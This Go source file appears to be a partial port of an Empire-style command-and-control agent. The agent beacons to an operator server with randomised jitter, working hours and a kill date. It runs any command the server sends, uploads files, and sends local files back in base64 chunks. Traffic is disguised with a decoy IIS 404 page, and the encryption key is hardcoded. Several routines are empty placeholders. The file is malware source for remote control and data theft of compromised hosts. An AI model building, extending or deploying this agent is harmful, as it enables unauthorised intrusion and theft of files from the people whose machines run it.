package main

import (
	"EmpirGo/common"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

type Task struct {
	Command string
	Args    []string
	Result  chan string
	Status  chan string
}

type MainAgent struct {
	packetHandler    *PacketHandler
	profile          string
	server           string
	sessionID        string
	killDate         string
	workingHours     string
	delay            int
	jitter           float64
	lostLimit        int
	defaultResponse  string
	jobMessageBuffer string
	socksThread      bool
	socksQueue       chan bool
	tasks            map[string]*Task
	userAgent        string
	headers          map[string]string
	encryptionKey    []byte
}

func NewMainAgent(packetHandler *PacketHandler, profile, server, sessionID, killDate, workingHours string, delay int, jitter float64, lostLimit int) *MainAgent {
	if strings.HasSuffix(server, "/") {
		server = server[:len(server)-1]
	}
	if !strings.HasPrefix(server, "http://") && !strings.HasPrefix(server, "https://") {
		server = "http://" + server
	}

	parts := strings.Split(profile, "|")
	taskURIs := strings.Split(parts[0], ",")
	userAgent := parts[1]

	packetHandler.taskURIs = taskURIs // Assign taskURIs to packetHandler
	packetHandler.sessionID = sessionID

	defaultResponse := "PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIvPgogICAgPHRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBmb3VuZC48L3RpdGxlPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggMTBweCAxNXB4O30gCmgxe2ZvbnQtc2l6ZToyLjRlbTttYXJnaW46MDtjb2xvcjojRkZGO30KaDJ7Zm9udC1zaXplOjEuN2VtO21hcmdpbjowO2NvbG9yOiNDQzAwMDA7fSAKaDN7Zm9udC1zaXplOjEuMmVtO21hcmdpbjoxMHB4IDAgMCAwO2NvbG9yOiMwMDAwMDA7fSAKI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGVudCI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50LWNvbnRhaW5lciI+CiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8aDI+NDA0IC0gRmlsZSBvciBkaXJlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgICAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg=="

	return &MainAgent{
		packetHandler:   packetHandler,
		profile:         profile,
		server:          server,
		sessionID:       sessionID,
		killDate:        killDate,
		workingHours:    workingHours,
		delay:           delay,
		jitter:          jitter,
		lostLimit:       lostLimit,
		defaultResponse: defaultResponse,
		tasks:           make(map[string]*Task),
		headers:         make(map[string]string),
		userAgent:       userAgent,
		encryptionKey:   []byte("AayD=*~d+Mg?!X`u-2F5P.r8xv:LR<sE"),
	}
}

func (ma *MainAgent) AgentExit() {
	if len(ma.tasks) > 0 {
		for _, task := range ma.tasks {
			task.Status <- "kill"
		}
	}
	os.Exit(0)
}

func (ma *MainAgent) SendJobMessageBuffer() {
	result := ma.GetJobMessageBuffer()
	ma.packetHandler.ProcessJobTasking(result)
}

func (ma *MainAgent) RunPrebuiltCommand(data string, resultID string) {
	parts := strings.Split(data, " ")
	var task *Task
	if len(parts) == 1 {
		data := parts[0]
		task = &Task{
			Command: data,
			Result:  make(chan string),
			Status:  make(chan string),
		}
	} else {
		cmd := parts[0]
		cmdArgs := parts[1:]
		task = &Task{
			Command: cmd,
			Args:    cmdArgs,
			Result:  make(chan string),
			Status:  make(chan string),
		}
	}
	ma.tasks[resultID] = task
	go ma.executeTask(task, resultID)
}

func (ma *MainAgent) executeTask(task *Task, resultID string) {
	result := ma.RunCommand(task.Command, task.Args...)
	task.Result <- result
	ma.packetHandler.SendMessage(ma.packetHandler.BuildResponsePacket(40, result, common.Atoi(resultID)))
	task.Status <- "completed"
	close(task.Result)
	close(task.Status)
}

func (ma *MainAgent) FileDownload(data, resultID string) {
	objPath, _ := filepath.Abs(data)
	fileList := []string{}
	if _, err := os.Stat(objPath); os.IsNotExist(err) {
		ma.packetHandler.SendMessage(ma.packetHandler.BuildResponsePacket(40, "file does not exist or cannot be accessed", common.Atoi(resultID)))
	}
	if fi, err := os.Stat(objPath); err == nil && !fi.IsDir() {
		fileList = append(fileList, objPath)
	} else {
		err := filepath.Walk(objPath, func(path string, info os.FileInfo, err error) error {
			if !info.IsDir() {
				fileList = append(fileList, path)
			}
			return nil
		})
		if err != nil {
			// Handle error
		}
	}

	task := &Task{
		Command: "filedownload",
		Args:    fileList,
		Result:  make(chan string),
		Status:  make(chan string),
	}
	ma.tasks[resultID] = task
	go ma.executeFileDownloadTask(task, resultID)
}

func Compress(data []byte) []byte {
	return data
}

func CRC32Data(data []byte) uint32 {
	return 0
}

func BuildHeader(data []byte, crc uint32) []byte {
	return data
}

func (ma *MainAgent) executeFileDownloadTask(task *Task, resultID string) {
	for _, filePath := range task.Args {
		offset := 0
		fi, _ := os.Stat(filePath)
		size := fi.Size()
		partIndex := 0
		for {
			encodedPart := ma.GetFilePart(filePath, offset, false)
			compData := Compress(encodedPart)
			startCRC32 := CRC32Data(encodedPart)
			compData = BuildHeader(compData, startCRC32)
			encodedPart = []byte(base64.StdEncoding.EncodeToString(compData))
			partData := fmt.Sprintf("%d|%s|%d|%s", partIndex, filePath, size, encodedPart)
			if string(encodedPart) == "" || len(encodedPart) == 16 {
				break
			}
			ma.packetHandler.SendMessage(ma.packetHandler.BuildResponsePacket(41, string(partData), common.Atoi(resultID)))
			minSleep := int((1.0 - ma.jitter) * float64(ma.delay))
			maxSleep := int((1.0 + ma.jitter) * float64(ma.delay))
			sleepTime := common.RandomInt(minSleep, maxSleep)
			time.Sleep(time.Duration(sleepTime) * time.Second)
			partIndex++
			offset += 512000
		}
	}
	ma.packetHandler.SendMessage(ma.packetHandler.BuildResponsePacket(41, "completed", common.Atoi(resultID)))
	ma.tasks[resultID].Status <- "completed"
}

func (ma *MainAgent) FileUpload(data, resultID string) {
	parts := strings.Split(data, "|")
	filePath := parts[0]
	base64Part := parts[1]
	raw, _ := base64.StdEncoding.DecodeString(base64Part)
	f, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		ma.packetHandler.SendMessage(ma.packetHandler.BuildResponsePacket(0, fmt.Sprintf("[!] Error in writing file %s during upload: %s", filePath, err.Error()), common.Atoi(resultID)))
		ma.tasks[resultID].Status <- "error"
		return
	}
	defer f.Close()
	if _, err := f.Write(raw); err != nil {
		ma.packetHandler.SendMessage(ma.packetHandler.BuildResponsePacket(0, fmt.Sprintf("[!] Error in writing file %s during upload: %s", filePath, err.Error()), common.Atoi(resultID)))
		ma.tasks[resultID].Status <- "error"
		return
	}
	ma.packetHandler.SendMessage(ma.packetHandler.BuildResponsePacket(42, fmt.Sprintf("[*] Upload of %s successful", filePath), common.Atoi(resultID)))
	ma.tasks[resultID].Status <- "completed"
}

func (ma *MainAgent) RunCommand(command string, cmdargs ...string) string {
	cmd := exec.Command(command, cmdargs...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v, Output: %s", err, string(output))
	}
	return string(output)
}

// Placeholder functions to avoid compilation errors
func (ma *MainAgent) GetJobMessageBuffer() string {
	return ""
}

func (ph *PacketHandler) ProcessJobTasking(result string) {}

func (ma *MainAgent) GetFilePart(filePath string, offset int, base64 bool) []byte {
	return []byte{}
}

func (ma *MainAgent) run() {
	for {
		// Check working hours if defined
		if ma.workingHours != "" {
			startEnd := strings.Split(ma.workingHours, "-")
			if len(startEnd) == 2 {
				now := time.Now()
				start, err1 := time.Parse("15:04", startEnd[0])
				end, err2 := time.Parse("15:04", startEnd[1])
				if err1 == nil && err2 == nil {
					if now.Before(start) || now.After(end) {
						sleepDuration := start.Sub(now)
						if now.After(end) {
							sleepDuration = time.Until(start.Add(24 * time.Hour))
						}
						time.Sleep(sleepDuration)
					}
				}
			}
		}

		// Check kill date if defined
		if ma.killDate != "" {
			now := time.Now().Format("01/02/2006")
			if now >= ma.killDate {
				fmt.Printf("[!] Agent %s exiting due to kill date reached\n", ma.sessionID)
				ma.AgentExit()
			}
		}

		// Check for missed check-ins
		if ma.packetHandler.missedCheckins >= ma.lostLimit {
			fmt.Printf("[!] Agent %s exiting due to missed check-ins limit reached\n", ma.sessionID)
			ma.AgentExit()
		}

		// Process job message buffer
		ma.SendJobMessageBuffer()

		// Send and receive messages
		code, data := ma.packetHandler.SendMessage(nil) // Placeholder for actual message sending
		if code == "200" {
			ma.packetHandler.missedCheckins = 0
			base64string := base64.StdEncoding.EncodeToString(data)

			if len(data) == 0 || base64string == ma.defaultResponse {
				continue
			} else {
				ma.packetHandler.decodeRoutingPacket(data)
			}
		} else {
			fmt.Printf("[!] Failed to send message, error code: %s\n", code)
		}

		minSleep := int((1.0 - ma.jitter) * float64(ma.delay))
		maxSleep := int((1.0 + ma.jitter) * float64(ma.delay))
		sleepTime := common.RandomInt(minSleep, maxSleep)
		time.Sleep(time.Duration(sleepTime) * time.Second)
	}
}
